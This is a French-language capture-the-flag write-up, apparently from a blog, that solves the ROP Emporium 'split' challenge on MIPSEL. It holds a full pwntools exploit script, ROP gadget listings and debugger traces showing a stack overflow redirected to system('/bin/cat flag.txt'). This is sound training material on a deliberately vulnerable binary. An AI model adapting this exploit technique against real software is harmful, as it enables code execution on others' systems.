---
Title: Ropemporium mipsel split
Date: 2023-07-02
Tags: [linux, python, ROP, mipsel, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---


# split MIPSEL

## Introduction.

Dans ce second exercice on doit passer une argument à la fonction appelée.
L'argument est présent dans le programme


Execution du programme avec qemu

ropemporium/mipsel/split$ qemu-mipsel split_mipsel
split by ROP Emporium
MIPS

Contriving a reason to ask user for data...
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
Erreur de segmentation

## Analyse

Ce gadget permet de charger t9 et a0 avec le contenu de la pile et appeller t9.


Le programme contien aussi la fonction usefulFunction qui appelle system("/bin/ls").

    [0x00400a20]> s sym.usefulFunction
    [0x004009c8]> pdf
    ┌ 84: sym.usefulFunction (int32_t arg1, int32_t arg_10h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           ; arg int32_t arg1 @ a0
    │           0x004009c8      e0ffbd27       addiu sp, sp, -0x20
    │           0x004009cc      1c00bfaf       sw ra, (var_1ch)
    │           0x004009d0      1800beaf       sw fp, (var_18h)
    │           0x004009d4      25f0a003       move fp, sp
    │           0x004009d8      42001c3c       lui gp, 0x42                ; 'B'
    │           0x004009dc      30909c27       addiu gp, gp, -0x6fd0
    │           0x004009e0      1000bcaf       sw gp, (var_10h)
    │           0x004009e4      4000023c       lui v0, 0x40                ; '@'
    │           0x004009e8      880c4424       addiu a0, v0, 0xc88         ; 0x400c88 ; "/bin/ls" ; arg1 ; str._bin_ls
    │===>       0x004009ec      5480828f       lw v0, -sym.imp.system(gp)  ; [0x411084:4]=0x400b70 sym.imp.system
    │           0x004009f0      25c84000       move t9, v0
    │           0x004009f4      09f82003       jalr t9
    │           0x004009f8      00000000       nop
    │           0x004009fc      1000dc8f       lw gp, (var_10h)
    │           0x00400a00      00000000       nop
    │           0x00400a04      25e8c003       move sp, fp
    │           0x00400a08      1c00bf8f       lw ra, (var_1ch)
    │           0x00400a0c      1800be8f       lw fp, (var_18h)
    │           0x00400a10      2000bd27       addiu sp, sp, 0x20
    │           0x00400a14      0800e003       jr ra
    └           0x00400a18      00000000       nop

La chaine de caractère utile est disponible dans le code.

[0x004009c8]> ps  @obj.usefulString
/bin/cat flag.txt

## Construction de l'attaque.

Notre objectif va être d'appeller la fonction system en appellant l'adresse 0x004009ec avec en paramètre l'adresse la la chaine "/bin/cat flag.txt".

Pour passer le paramêtre il nous faut charger le registre a0 avec l'adresse 0x004009c8.

### Recherche de gadgets
Gadgets présents dans le programme :


    [0x00400a20]> pd 10
            ;-- usefulGadgets:
            0x00400a20      0800a48f       lw a0, 8(sp)
            0x00400a24      0400b98f       lw t9, 4(sp)
            0x00400a28      09f82003       jalr t9
            0x00400a2c      00000000       nop

Ca gadget pourrait être trouvé avec ROPgadget en recherchant le moyen de charge $0 :

    mipsel/split$ grep "lw \$a0" ropgadgets.txt
    0x00400a10 : addiu $sp, $sp, 0x20 ; jr $ra ; nop ; nop ; lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
    0x00400a14 : jr $ra ; nop ; nop ; lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
    0x00400a20 : lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
    0x00400a0c : lw $fp, 0x18($sp) ; addiu $sp, $sp, 0x20 ; jr $ra ; nop ; nop ; lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
    0x00400a08 : lw $ra, 0x1c($sp) ; lw $fp, 0x18($sp) ; addiu $sp, $sp, 0x20 ; jr $ra ; nop ; nop ; lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
    0x00400a04 : move $sp, $fp ; lw $ra, 0x1c($sp) ; lw $fp, 0x18($sp) ; addiu $sp, $sp, 0x20 ; jr $ra ; nop ; nop ; lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
    0x00400a1c : nop ; lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
    0x00400a18 : nop ; nop ; lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop

On a bien notre gadget en 0x00400a20.


### La ropchaine

| ROP entry | comment |
| ----------- | ------- |
| 0x00400a20 | lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop |
| 0x004009ec | appel system |
| 0x004009c8 | @ /bin/cat flag.txt |


## Exploitation

### Script python

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('split_mipsel')

usefulString = elf.symbols["usefulString"]
usefulFunction = elf.symbols["usefulFunction"]

gs='''
b *pwnme+204
c
'''

g_lwa0t9 = 0x400a20

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


time.sleep(.5)


io.recvuntil(b"> ")

system = elf.got['system']

log.info(f"{usefulString=:x}")
system = usefulFunction+36

PL=0x24*b"A"+p32(g_lwa0t9)+p32(0)+p32(system)+p32(usefulString)
io.sendline(PL)
io.interactive()

```
### Execution

Point d'arret en fin de pwnme

    ─────────────────────────────────────────────────────────── code:mips:MIPS32 ────
        0x4009b4 <pwnme+192>      lw     ra, 60(sp)
        0x4009b8 <pwnme+196>      lw     s8, 56(sp)
        0x4009bc <pwnme+200>      addiu  sp, sp, 64
    →   0x4009c0 <pwnme+204>      jr     ra
    ↳    0x400a20 <usefulGadgets+0> lw     a0, 8(sp)
            0x400a24 <usefulGadgets+4> lw     t9, 4(sp)
            0x400a28 <usefulGadgets+8> jalr   t9
            0x400a2c <usefulGadgets+12> nop
            0x400a30 <__libc_csu_init+0> lui    gp, 0x2
            0x400a34 <__libc_csu_init+4> addiu  gp, gp, -31232

    gef➤ i r
            zero       at       v0       v1       a0       a1       a2       a3
    R0   00000000 00000001 0000000b ffffffff 3fface2c ffffffff 00000001 00000000
                t0       t1       t2       t3       t4       t5       t6       t7
    R8   00000008 000005f7 3ffc7860 3ffff300 3fe25070 00000000 3fe1b780 0000000c
                s0       s1       s2       s3       s4       s5       s6       s7
    R16  00000000 00400a30 00000000 00000000 00000000 00000000 3ffff300 00000000
                t8       t9       k0       k1       gp       sp       s8       ra
    R24  00000000 3fe95af0 00000000 00000000 00419030 40800320 41414141 00400a20
                sr       lo       hi      bad    cause       pc
        24000010 001f8de0 000001a1 00000000 00000000 004009c0
            fsr      fir
        00000000 00739300


    gef➤  i r a0
    a0: 0x411010

    gef➤  ni

        0x400a1c                  nop
        0x400a20 <usefulGadgets+0> lw     a0, 8(sp)
        0x400a24 <usefulGadgets+4> lw     t9, 4(sp)
    →   0x400a28 <usefulGadgets+8> jalr   t9
        0x400a2c <usefulGadgets+12> nop

    gef➤  i r $a0 $t9
    a0: 0x411010
    t9: 0x4009ec

    gef➤  si
        0x4009e0 <usefulFunction+24> sw     gp, 16(sp)
        0x4009e4 <usefulFunction+28> lui    v0, 0x40
        0x4009e8 <usefulFunction+32> addiu  a0, v0, 3208
    →   0x4009ec <usefulFunction+36> lw     v0, -32684(gp)

On a appelle bien l'adresse attendue.

    gef➤  continue


Sur le'ecran d'appel du programme :

    ROPE{a_placeholder_32byte_flag!}








